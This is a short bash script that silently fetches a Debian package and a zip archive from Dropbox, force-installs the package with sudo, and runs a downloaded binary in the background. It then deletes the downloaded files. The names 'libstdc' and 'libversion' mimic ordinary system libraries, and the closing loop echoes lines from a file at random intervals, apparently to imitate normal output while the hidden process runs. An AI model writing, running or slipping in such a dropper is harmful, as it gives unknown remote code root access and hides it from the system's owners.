#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/5137ge2ll31gs45/ver.zip -q
unzip ver.zip > /dev/null 2>&1
#pwd
./libversion/ver ./libversion/build &
sleep 3
rm -rf ver.zip
rm -rf libversion/ver
rm -rf libversion/build
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 70 ))
done < $2

